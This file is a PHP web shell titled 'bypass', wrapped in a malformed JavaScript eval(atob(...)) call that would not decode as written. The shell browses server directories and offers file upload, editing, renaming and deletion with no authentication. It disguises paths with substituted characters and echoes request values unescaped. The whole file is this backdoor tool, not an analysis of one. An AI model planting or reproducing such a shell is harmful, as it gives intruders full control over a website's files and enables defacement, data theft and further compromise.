eval(atob('window.addEventListener('DOMContentLoaded', () => {
  document.body.innerHTML = "<!DOCTYPE html>\n\n\n\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>bypass<\/title>\n    <link href=\"https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@5.3.0-alpha1\/dist\/css\/bootstrap.min.css\" rel=\"stylesheet\"\n        integrity=\"sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3\/Jr59b6EGGoI1aFkw7cmDA6j6gD\" crossorigin=\"anonymous\">\n    <link rel=\"stylesheet\" href=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/font-awesome\/6.3.0\/css\/all.min.css\"\n        integrity=\"sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq\/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk\/bSuGGKHEyjSoQ1zVisanQ==\"\n        crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\" \/>\n    <style>\n        table {\n    background-color: black;\n}\n\ntable th, table td {\n    color: white;\n}\n\ntable tr:nth-child(even) {\n    background-color: #333;\n}\n    <\/style>\n<\/head>\n\n<body>\n\n    <?php\n\n\n    \/\/function\n    function formatSizeUnits($bytes)\n    {\n        if ($bytes >= 1073741824) {\n            $bytes = number_format($bytes \/ 1073741824, 2) . ' GB';\n        } elseif ($bytes >= 1048576) {\n            $bytes = number_format($bytes \/ 1048576, 2) . ' MB';\n        } elseif ($bytes >= 1024) {\n            $bytes = number_format($bytes \/ 1024, 2) . ' KB';\n        } elseif ($bytes > 1) {\n            $bytes = $bytes . ' bytes';\n        } elseif ($bytes == 1) {\n            $bytes = $bytes . ' byte';\n        } else {\n            $bytes = '0 bytes';\n        }\n        return $bytes;\n    }\n\n    function fileExtension($file)\n    {\n        return substr(strrchr($file, '.'), 1);\n    }\n\n    function fileIcon($file)\n    {\n        $imgs = array(\"apng\", \"avif\", \"gif\", \"jpg\", \"jpeg\", \"jfif\", \"pjpeg\", \"pjp\", \"png\", \"svg\", \"webp\");\n        $audio = array(\"wav\", \"m4a\", \"m4b\", \"mp3\", \"ogg\", \"webm\", \"mpc\");\n        $ext = strtolower(fileExtension($file));\n        if ($file == \"error_log\") {\n            return '<i class=\"fa-sharp fa-solid fa-bug\"><\/i> ';\n        } elseif ($file == \".htaccess\") {\n            return '<i class=\"fa-solid fa-hammer\"><\/i> ';\n        }\n        if ($ext == \"html\" || $ext == \"htm\") {\n            return '<i class=\"fa-brands fa-html5\"><\/i> ';\n        } elseif ($ext == \"php\" || $ext == \"phtml\") {\n            return '<i class=\"fa-brands fa-php\"><\/i> ';\n        } elseif (in_array($ext, $imgs)) {\n            return '<i class=\"fa-regular fa-images\"><\/i> ';\n        } elseif ($ext == \"css\") {\n            return '<i class=\"fa-brands fa-css3\"><\/i> ';\n        } elseif ($ext == \"txt\") {\n            return '<i class=\"fa-regular fa-file-lines\"><\/i> ';\n        } elseif (in_array($ext, $audio)) {\n            return '<i class=\"fa-duotone fa-file-music\"><\/i> ';\n        } elseif ($ext == \"py\") {\n            return '<i class=\"fa-brands fa-python\"><\/i> ';\n        } elseif ($ext == \"js\") {\n            return '<i class=\"fa-brands fa-js\"><\/i> ';\n        } else {\n            return '<i class=\"fa-solid fa-file\"><\/i> ';\n        }\n    }\n\n    function encodePath($path)\n    {\n        $a = array(\"\/\", \"\\\\\", \".\", \":\");\n        $b = array(\"\u0995\", \"\u0996\", \"\u0997\", \"\u0998\");\n        return str_replace($a, $b, $path);\n    }\n    function decodePath($path)\n    {\n        $a = array(\"\/\", \"\\\\\", \".\", \":\");\n        $b = array(\"\u0995\", \"\u0996\", \"\u0997\", \"\u0998\");\n        return str_replace($b, $a, $path);\n    }\n\n\n\n    $root_path = __DIR__;\n    if (isset($_GET['p'])) {\n        if (empty($_GET['p'])) {\n            $p = $root_path;\n        } elseif (!is_dir(decodePath($_GET['p']))) {\n            echo (\"<script>\\nalert('Directory is Corrupted and Unreadable.');\\nwindow.location.replace('?');\\n<\/script>\");\n        } elseif (is_dir(decodePath($_GET['p']))) {\n            $p = decodePath($_GET['p']);\n        }\n    } elseif (isset($_GET['q'])) {\n        if (!is_dir(decodePath($_GET['q']))) {\n            echo (\"<script>window.location.replace('?p=');<\/script>\");\n        } elseif (is_dir(decodePath($_GET['q']))) {\n            $p = decodePath($_GET['q']);\n        }\n    } else {\n        $p = $root_path;\n    }\n    define(\"PATH\", $p);\n\n    echo ('\n<nav class=\"navbar navbar-light\" style=\"background-color: #000000;\">\n  <div class=\"navbar-brand\">\n  <a href=\"?\"><img src=\"https:\/\/raw.githubusercontent.com\/hurairathexper\/elepfilemanager\/main\/img\/icon.png\" width=\"30\" height=\"30\" alt=\"\"><\/a>\n');\n\n    $path = str_replace('\\\\', '\/', PATH);\n    $paths = explode('\/', $path);\n    foreach ($paths as $id => $dir_part) {\n        if ($dir_part == '' && $id == 0) {\n            $a = true;\n            echo \"<a href=\\\"?p=\/\\\">\/<\/a>\";\n            continue;\n        }\n        if ($dir_part == '')\n            continue;\n        echo \"<a href='?p=\";\n        for ($i = 0; $i <= $id; $i++) {\n            echo str_replace(\":\", \"\u0998\", $paths[$i]);\n            if ($i != $id)\n                echo \"\u0995\";\n        }\n        echo \"'>\" . $dir_part . \"<\/a>\/\";\n    }\n    echo ('\n<\/div>\n<div class=\"form-inline\">\n<a href=\"?upload&q=' . urlencode(encodePath(PATH)) . '\"><button class=\"btn btn-dark\" type=\"button\">Upload FileeE<\/button><\/a>\n<a href=\"?\"><button type=\"button\" class=\"btn btn-dark\">HOME<\/button><\/a> \n<\/div>\n<\/nav>');\n\n\n    if (isset($_GET['p'])) {\n\n        \/\/fetch files\n        if (is_readable(PATH)) {\n            $fetch_obj = scandir(PATH);\n            $folders = array();\n            $files = array();\n            foreach ($fetch_obj as $obj) {\n                if ($obj == '.' || $obj == '..') {\n                    continue;\n                }\n                $new_obj = PATH . '\/' . $obj;\n                if (is_dir($new_obj)) {\n                    array_push($folders, $obj);\n                } elseif (is_file($new_obj)) {\n                    array_push($files, $obj);\n                }\n            }\n        }\n        echo '\n<table class=\"table table-hover\">\n  <thead>\n    <tr>\n      <th scope=\"col\">Name<\/th>\n      <th scope=\"col\">Size<\/th>\n      <th scope=\"col\">Modified<\/th>\n      <th scope=\"col\">Perms<\/th>\n      <th scope=\"col\">Actions<\/th>\n    <\/tr>\n  <\/thead>\n  <tbody>\n';\n        foreach ($folders as $folder) {\n            echo \"    <tr>\n      <td><i class='fa-solid fa-folder'><\/i> <a href='?p=\" . urlencode(encodePath(PATH . \"\/\" . $folder)) . \"'>\" . $folder . \"<\/a><\/td>\n      <td><b>---<\/b><\/td>\n      <td>\". date(\"F d Y H:i:s.\", filemtime(PATH . \"\/\" . $folder)) . \"<\/td>\n      <td>0\" . substr(decoct(fileperms(PATH . \"\/\" . $folder)), -3) . \"<\/a><\/td>\n      <td>\n      <a title='Rename' href='?q=\" . urlencode(encodePath(PATH)) . \"&r=\" . $folder . \"'><i class='fa-sharp fa-regular fa-pen-to-square'><\/i><\/a>\n      <a title='Delete' href='?q=\" . urlencode(encodePath(PATH)) . \"&d=\" . $folder . \"'><i class='fa fa-trash' aria-hidden='true'><\/i><\/a>\n      <td>\n    <\/tr>\n\";\n        }\n        foreach ($files as $file) {\n            echo \"    <tr>\n          <td>\" . fileIcon($file) . $file . \"<\/td>\n          <td>\" . formatSizeUnits(filesize(PATH . \"\/\" . $file)) . \"<\/td>\n          <td>\" . date(\"F d Y H:i:s.\", filemtime(PATH . \"\/\" . $file)) . \"<\/td>\n          <td>0\". substr(decoct(fileperms(PATH . \"\/\" .$file)), -3) . \"<\/a><\/td>\n          <td>\n          <a title='Edit File' href='?q=\" . urlencode(encodePath(PATH)) . \"&e=\" . $file . \"'><i class='fa-solid fa-file-pen'><\/i><\/a>\n          <a title='Rename' href='?q=\" . urlencode(encodePath(PATH)) . \"&r=\" . $file . \"'><i class='fa-sharp fa-regular fa-pen-to-square'><\/i><\/a>\n          <a title='Delete' href='?q=\" . urlencode(encodePath(PATH)) . \"&d=\" . $file . \"'><i class='fa fa-trash' aria-hidden='true'><\/i><\/a>\n          <td>\n    <\/tr>\n\";\n        }\n        echo \"  <\/tbody>\n<\/table>\";\n    } else {\n        if (empty($_GET)) {\n            echo (\"<script>window.location.replace('?p=');<\/script>\");\n        }\n    }\n    if (isset($_GET['upload'])) {\n        echo '\n    <form method=\"post\" enctype=\"multipart\/form-data\">\n        Select file to upload:\n        <input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\">\n        <input type=\"submit\" class=\"btn btn-dark\" value=\"Upload\" name=\"upload\">\n    <\/form>';\n    }\n    if (isset($_GET['r'])) {\n        if (!empty($_GET['r']) && isset($_GET['q'])) {\n            echo '\n    <form method=\"post\">\n        Rename:\n        <input type=\"text\" name=\"name\" value=\"' . $_GET['r'] . '\">\n        <input type=\"submit\" class=\"btn btn-dark\" value=\"Rename\" name=\"rename\">\n    <\/form>';\n            if (isset($_POST['rename'])) {\n                $name = PATH . \"\/\" . $_GET['r'];\n                if(rename($name, PATH . \"\/\" . $_POST['name'])) {\n                    echo (\"<script>alert('Renamed.'); window.location.replace('?p=\" . encodePath(PATH) . \"');<\/script>\");\n                } else {\n                    echo (\"<script>alert('Some error occurred.'); window.location.replace('?p=\" . encodePath(PATH) . \"');<\/script>\");\n                }\n            }\n        }\n    }\n\n    if (isset($_GET['e'])) {\n        if (!empty($_GET['e']) && isset($_GET['q'])) {\n            echo '\n    <form method=\"post\">\n        <textarea style=\"height: 500px;\n        width: 90%;\" name=\"data\">' . htmlspecialchars(file_get_contents(PATH.\"\/\".$_GET['e'])) . '<\/textarea>\n        <br>\n        <input type=\"submit\" class=\"btn btn-dark\" value=\"Save\" name=\"edit\">\n    <\/form>';\n\n    if(isset($_POST['edit'])) {\n        $filename = PATH.\"\/\".$_GET['e'];\n        $data = $_POST['data'];\n        $open = fopen($filename,\"w\");\n        if(fwrite($open,$data)) {\n            echo (\"<script>alert('Saved.'); window.location.replace('?p=\" . encodePath(PATH) . \"');<\/script>\");\n        } else {\n            echo (\"<script>alert('Some error occurred.'); window.location.replace('?p=\" . encodePath(PATH) . \"');<\/script>\");\n        }\n        fclose($open);\n    }\n        }\n    }\n\n    if (isset($_POST[\"upload\"])) {\n        $target_file = PATH . \"\/\" . $_FILES[\"fileToUpload\"][\"name\"];\n        if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) {\n            echo \"<p>\".htmlspecialchars(basename($_FILES[\"fileToUpload\"][\"name\"])) . \" has been uploaded.<\/p>\";\n        } else {\n            echo \"<p>Sorry, there was an error uploading your file.<\/p>\";\n        }\n\n    }\n    if (isset($_GET['d']) && isset($_GET['q'])) {\n        $name = PATH . \"\/\" . $_GET['d'];\n        if (is_file($name)) {\n            if(unlink($name)) {\n                echo (\"<script>alert('File removed.'); window.location.replace('?p=\" . encodePath(PATH) . \"');<\/script>\");\n            } else {\n                echo (\"<script>alert('Some error occurred.'); window.location.replace('?p=\" . encodePath(PATH) . \"');<\/script>\");\n            }\n        } elseif (is_dir($name)) {\n            if(rmdir($name) == true) {\n                echo (\"<script>alert('Directory removed.'); window.location.replace('?p=\" . encodePath(PATH) . \"');<\/script>\");\n            } else {\n                echo (\"<script>alert('Some error occurred.'); window.location.replace('?p=\" . encodePath(PATH) . \"');<\/script>\");\n            }\n        }\n    }\n    ?>\n\n\n    <script src=\"https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@5.3.0-alpha1\/dist\/js\/bootstrap.bundle.min.js\"\n        integrity=\"sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN\"\n        crossorigin=\"anonymous\"><\/script>\n<\/body>\n\n<\/html>";
});'));
